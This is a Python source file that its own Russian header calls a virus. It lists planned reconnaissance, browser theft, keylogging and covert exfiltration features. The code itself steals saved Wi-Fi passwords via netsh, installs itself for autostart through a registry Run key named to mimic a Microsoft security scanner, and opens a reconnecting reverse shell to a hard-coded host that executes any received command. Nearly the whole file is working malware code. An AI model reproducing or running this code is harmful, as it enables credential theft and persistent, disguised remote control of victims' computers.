# encoding: cp866
##########################################################################
## Необходимые функции вируса:                                          ##
##                                                                      ##
## 1) Сбор данных о топологии сети и хостах в ней                       ##
## ~~ Первый раз при запуске и далее по расписанию                      ##
##                                                                      ##
## 2) Сбор данных браузеров                                             ##
## ~~ Первый раз при запуске и далее по расписанию                      ##
##                                                                      ##
## 3) Создание скриншота                                                ##
## ~~ Один раз при запуске                                              ##
##                                                                      ##
## 4) Сбор паролей wifi-сетей (OK)                                      ##
## ~~ Первый раз при запуске и далее по расписанию                      ##
##                                                                      ##
## 5) Открытие reverse-shell                                            ##
## ~~ Пытаться соединиться с удаленным хостом по расписанию             ##
##                                                                      ##
## 6) Создание отчета о собранных данных                                ##
## ~~ По расписанию                                                     ##
##                                                                      ##
## 7) Система разбиения отчета                                          ##
## ~~ Порционная отправка данных. Необходима для более скрытной работы. ##
##                                                                      ##
## 8) Кейлоггер                                                         ##
##                                                                      ##
## 9) Автозагрузка (OK)                                                 ##
##########################################################################

import argparse
import re
import socket
import subprocess
import os
import time
# from MSE.shell import *

__codec__ = 'cp866'


def list_print(data):
    for i in data:
        print(i)


def dict_print(data):
    for key in data.keys():
        print('{:>30} - {:<30}'.format(key, data.get(key)))


def args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--server', dest='server', help='reverse shell server')
    return parser.parse_args()


def autoload(filename, reg_value, tempdir='%temp%',
             reg_dir='SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
             single_file=False):

    try:
        import winreg
    except ImportError:
        return

    os.system('copy {} {}'.format(filename, tempdir))
    if not single_file:
        os.system('copy {} {}'.format('lib', tempdir))
        os.system('copy {} {}'.format('python36.dll', tempdir))

    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_dir)
    regkeys = []
    try:
        i = 0
        while True:
            subkey = winreg.EnumValue(key, i)
            regkeys.append(subkey)
            i += 1
    except WindowsError as err:
        print(err)

    if reg_value not in regkeys:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_dir, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, reg_value, 0, winreg.REG_SZ, '{}{}'.format(tempdir, filename))
            key.Close()
        except WindowsError as err:
            print(err)


class Grab:

    __subproc__ = None

    @staticmethod
    def execute(cmd):
        console = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        out, err = console.communicate()
        return out

    def wifi_passwords(self):
        cmd_profiles = 'netsh wlan show profiles'
        cmd_concrete_profile = 'netsh wlan show profiles name="{profile}" key=clear'
        codec = 'cp866'

        console = self.execute(cmd_profiles).decode(codec)
        profiles = re.findall(': ([\w\s\d]*)\r\n', console)
        profiles = [i.rstrip('\r\n') for i in profiles]

        wifi_networks = {}
        for profile in profiles:
            password = self.execute(cmd_concrete_profile.format(profile=profile)).decode(__codec__)
            password = re.findall('Содержимое ключа[\s]* : ([\w\d]*)\r', password)
            wifi_networks.update({profile: password[0]})
        return wifi_networks


class ReverseShell:
    def __init__(self):
        self.__buffer__ = 4096
        self.sleep_sec = 2 #1200
        self.timeout = 60 #300

    @staticmethod
    def execute(command):
        console = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output = console.stdout.read() + console.stderr.read()
        return output

    def try_connect(self, host, port):
        connection = socket.socket()
        connection.settimeout(self.timeout)
        while connection.connect_ex((host, port)) == 10061:
            print('Trying to connect')
            time.sleep(self.sleep_sec)
        print('Connected')
        return connection

    def open(self, host, port):
        pc_name = os.environ.get('COMPUTERNAME')
        conn = self.try_connect(host, port)
        conn.send(pc_name.encode())
        while True:
            try:
                cmd = conn.recv(self.__buffer__).decode()
                output = self.execute(cmd)
                if not output:
                    output = b"OK"
                conn.send(output)
            except:
                print('Connection lost')
                conn = self.try_connect(host, port)
                conn.send(pc_name.encode())

    def sleep_on_failure(self, seconds):
        self.sleep_sec = seconds


if __name__ == '__main__':
    grab = Grab()
    print(vars(args()).get('server'))
    print(grab.wifi_passwords())
    autoload(filename='MSE.exe', reg_value='MSEScanner', tempdir='%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp')

    shell = ReverseShell()
    shell.open('192.168.0.20', 5432)

    exit(input('Enter for exit...'))